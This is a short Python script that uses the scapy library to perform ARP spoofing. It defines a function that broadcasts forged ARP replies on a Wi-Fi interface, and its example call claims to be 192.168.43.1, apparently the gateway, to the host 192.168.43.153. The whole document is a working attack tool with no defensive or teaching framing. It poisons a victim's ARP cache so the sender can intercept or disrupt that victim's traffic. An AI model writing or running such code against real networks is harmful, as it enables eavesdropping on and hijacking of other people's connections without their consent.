from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip):
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    packet = ether / arp
    sendp(packet, iface="Wi-Fi", verbose=False)

# Example usage
arp_spoof("192.168.43.153", "192.168.43.1")
